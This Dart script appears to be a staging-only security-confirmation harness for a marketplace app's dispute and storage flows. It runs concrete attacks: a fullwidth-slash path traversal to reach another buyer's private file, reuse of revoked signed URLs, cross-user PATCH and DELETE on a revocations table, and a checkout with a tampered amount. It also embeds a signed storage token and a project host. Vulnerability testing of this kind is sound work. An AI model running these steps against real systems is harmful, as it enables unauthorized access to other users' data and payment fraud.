/// Confirma HOLDs DV — sem corrigir. Staging only.
import 'dart:convert';
import 'dart:io';
import '_rtdv.dart';

const pngBytes = <int>[
  0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D,
  0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
  0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE, 0x00, 0x00, 0x00,
  0x0C, 0x49, 0x44, 0x41, 0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
  0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xFE, 0xD4, 0xEF, 0x00, 0x00,
  0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
];

void main() async {
  final c = Rtdv.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();

  const oid = 'a2a4618c-7417-43d0-87da-036c912adfab';
  const did = '1296b2ca-1cba-4026-a054-cd332c068926';
  const d2oid = 'f15201bd-03ca-4e9a-ac8b-cda593eff56c';
  const d2pid = 'cc5c7729-6c28-407b-8a38-99c650014677';
  const c2oid = '9b3e21b6-3ba3-42a2-81a6-3315a75d70bf';
  const mixA = '97655c18-c0aa-491a-af00-97c457a7e1f2';
  const mixB = 'd0167d3b-e36e-43b6-bb7b-3159d66ea0e3';
  final b1 = c.buyerId!;
  final b2 = c.buyer2Id!;

  Future<HttpHit> canon(String url) =>
      c.rpc('batata_storage_url_path_canonical', {'p_url': url}, service: true);
  Future<HttpHit> ok(String url, {String? buyer, String? order}) => c.rpc(
        'batata_dispute_proof_url_ok',
        {
          'p_url': url,
          'p_buyer': buyer ?? b1,
          'p_oid': order ?? oid,
        },
        service: true,
      );

  const fullwidth = '\uff0f';
  final mineNoQ =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
      'order_disputes/$b1/$oid/ok.png';
  final a2NoQ =
      '$mineNoQ${fullwidth}order_disputes/$b2/00000000-0000-0000-0000-00000000dv02/rtdv-secret.png';
  final revokeNoQ =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
      'order_disputes/$b1/$oid/revoke.png';

  final out = <String, Object?>{};

  out['a2_noq'] = {
    'canon': (await canon(a2NoQ)).body,
    'proof_ok': (await ok(a2NoQ)).body,
    'has_ff0f': a2NoQ.contains(fullwidth),
  };

  final a2Patch = await c.patchDispute(did, {'return_label_url': a2NoQ});
  final a2Row = await c.disputeRow(did);
  out['a2_persist_label'] = {
    'hit': a2Patch.brief,
    'stored': a2Row?['return_label_url'],
    'kept_ff0f': '${a2Row?['return_label_url']}'.contains(fullwidth),
  };

  final a2Photos = await c.patchDispute(did, {
    'proof_photos': [a2NoQ],
  });
  final a2Row2 = await c.disputeRow(did);
  out['a2_persist_photos'] = {
    'hit': a2Photos.brief,
    'photos': a2Row2?['proof_photos'],
  };

  // A4: proof_ok on deleted object URL (no query)
  out['a4_proof_ok_noq'] = (await ok(revokeNoQ)).body;
  final a4Auth = await c.storageGet(
    'order_disputes/$b1/$oid/revoke.png',
    jwt: c.buyerJwt,
  );
  out['a4_auth_get'] = a4Auth.brief;
  final a4Row = await c.rest(
    'GET',
    'batata_private_object_revoked?object_path=eq.order_disputes/$b1/$oid/revoke.png&select=*',
    service: true,
  );
  out['a4_revoked_row'] = a4Row.brief;

  // New disputa with revoked URL as proof?
  final a4New = await c.insertDispute(orderId: oid, photos: [revokeNoQ]);
  out['a4_new_dispute_revoked_url'] = {
    'hit': a4New.brief,
    'id': a4New.firstId,
  };

  // Signed CDN still 200?
  final signed = await c.signObject(
    'order_disputes/$b1/$oid/revoke.png',
    jwt: c.buyerJwt,
  );
  HttpHit cdn = HttpHit(0, 'no_sign', null);
  if (signed != null) {
    cdn = await c.storageGetSigned(signed);
  }
  out['a5_resign_deleted'] = {'sign': signed, 'get': cdn.brief};

  // Old signed from pass1 notes
  const oldSigned =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/a2a4618c-7417-43d0-87da-036c912adfab/revoke.png?token=eyJraWQiOiI3YmY5ZTQ0Ni1mOTg4LTRlNWEtYjM0Mi0zYTQ1ZTE5NTgzYzkiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJmbGVhYmVyX3ByaXZhdGUvb3JkZXJfZGlzcHV0ZXMvYmZjYmVlZWUtN2RjMS00Y2QxLWIyYTctZDNhMGE2Y2Y3Yzk2L2EyYTQ2MThjLTc0MTctNDNkMC04N2RhLTAzNmM5MTJhZGZhYi9yZXZva2UucG5nIiwic2NvcGUiOiJkb3dubG9hZCIsImlhdCI6MTc4ODcxMjk2MSwiZXhwIjoxNzg4NzE2NTYxfQ.B8zkKD5o9xPr9yy74Ei7DWgbGBtcYoJ7mGHcYQ0i-jY';
  out['a5_old_signed'] = (await c.storageGetSigned(oldSigned)).brief;

  // A6: proof_ok on non-existent svg path (no query)
  final svgUrl =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
      'order_disputes/$b1/$oid/poly.svg';
  out['a6_proof_ok_ghost_svg'] = (await ok(svgUrl)).body;

  // A7: table dump as B1 JWT, insert second path, try UPDATE/DELETE
  final selB1 = await c.revokedSelect(jwt: c.buyerJwt);
  out['a7_select_b1'] = {
    'status': selB1.status,
    'n': selB1.list.length,
    'paths': selB1.list
        .map((e) => e is Map ? e['object_path'] : e)
        .toList(),
  };
  final ins2 = await c.revokedInsert(
    'order_proofs/$b2/hostile-proof.png',
    jwt: c.buyerJwt,
  );
  out['a7_insert_proofs_b2'] = ins2.brief;
  final upd = await c.rest(
    'PATCH',
    'batata_private_object_revoked?object_path=eq.order_disputes/$b2/$oid/hostile-revoke.png',
    jwt: c.buyerJwt,
    body: {'revoked_by': b1},
  );
  out['a7_patch'] = upd.brief;
  final del = await c.rest(
    'DELETE',
    'batata_private_object_revoked?object_path=eq.order_disputes/$b2/$oid/hostile-revoke.png',
    jwt: c.buyerJwt,
  );
  out['a7_delete'] = del.brief;
  final anonSel = await c.revokedSelect();
  out['a7_select_anon'] = anonSel.brief;

  // D2 stock
  final d2o = await c.orderRow(d2oid);
  final d2p = await c.productRow(d2pid);
  out['d2_oracle'] = {
    'order_status': d2o?['status'],
    'qty': d2p?['quantity'],
    'refund_id': d2o?['stripe_refund_id'],
    'amount_paid': d2o?['amount_paid_cents'],
  };

  // C2 shipping
  out['c2_row'] = {
    'shipping': (await c.orderRow(c2oid))?['shipping_method'],
    'paid': (await c.orderRow(c2oid))?['amount_paid_cents'],
    'sid': (await c.orderRow(c2oid))?['stripe_checkout_session_id'],
  };

  // C3 retry bag
  final mixHit = await c.checkoutBag(
    lines: [
      {
        'order_id': mixA,
        'product_id': (await c.orderRow(mixA))?['product_id'],
        'quantity': 1,
      },
      {
        'order_id': mixB,
        'product_id': (await c.orderRow(mixB))?['product_id'],
        'quantity': 1,
      },
    ],
    amount: 1,
    shipping: 'mao',
  );
  out['c3_retry'] = {
    'hit': mixHit.brief,
    'amt': mixHit.amountTotal,
    'a_ship': (await c.orderRow(mixA))?['shipping_method'],
    'b_ship': (await c.orderRow(mixB))?['shipping_method'],
  };

  // Happy label persist own signed
  final ownSigned = await c.signObject(
    'order_disputes/$b1/$oid/ok.png',
    jwt: c.buyerJwt,
  );
  if (ownSigned != null) {
    final lab = await c.patchDispute(did, {'return_label_url': ownSigned});
    out['d1_label'] = {
      'hit': lab.brief,
      'stored': (await c.disputeRow(did))?['return_label_url'],
    };
  }

  await dumpJson('${outDir()}/confirm.json', out);
  stdout.writeln(const JsonEncoder.withIndent('  ').convert(out));
}
